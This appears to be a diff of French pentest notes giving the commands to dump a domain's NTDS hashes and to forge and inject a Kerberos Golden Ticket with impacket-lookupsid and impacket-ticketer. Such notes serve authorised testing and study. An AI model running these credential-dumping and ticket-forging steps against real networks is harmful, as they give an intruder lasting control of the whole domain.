@@ -22,16 +22,13 @@ nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
 2. Forger et injecter le Golden Ticket
 
 ```bash
-# Obtenir le Domain SID
+# Obtenir le Domain SID ET le RID du compte cible en une seule commande
 impacket-lookupsid corp.com/<user>:<password>@<IP_DC>
-# → "Domain SID is: S-1-5-21-XXXX-XXXX-XXXX" affiché en premier
+# S-1-5-21-YYY-YYY-YYY-RID
+# Enlever le RID et on obtient le domain-sid
 
-# Alternative — whoami /user sur le DC (retirer le RID final, ex: -500)
-nxc smb <IP_DC> -u <user> -H <HASH> -x 'whoami /user'
-# S-1-5-21-1987370270-658905905-1781884369-500 → Domain SID = S-1-5-21-1987370270-658905905-1781884369
-
-# Forger le ticket
-impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain corp.com <username>
+# Forger le ticket (-user-id obligatoire sur Server 2022+)
+impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain corp.com -user-id <RID> <username>
 # → génère <username>.ccache
 
 # Charger et utiliser
